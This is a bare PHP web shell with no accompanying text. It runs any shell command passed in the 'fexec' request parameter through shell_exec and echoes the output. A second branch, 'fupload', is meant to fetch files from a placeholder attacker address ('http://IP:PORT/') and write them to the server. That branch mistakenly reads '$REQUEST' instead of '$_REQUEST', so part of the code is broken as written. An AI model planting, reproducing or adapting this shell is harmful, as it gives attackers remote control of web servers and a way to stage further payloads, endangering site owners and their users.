<?php
  if (isset($_REQUEST['fupload'])) {
    file_put_contents($REQUEST['fupload'], file_get_contents("http://IP:PORT/" . $REQUEST['fupload']));
  };
  if (isset($_REQUEST['fexec'])) {
    echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
  };
?>
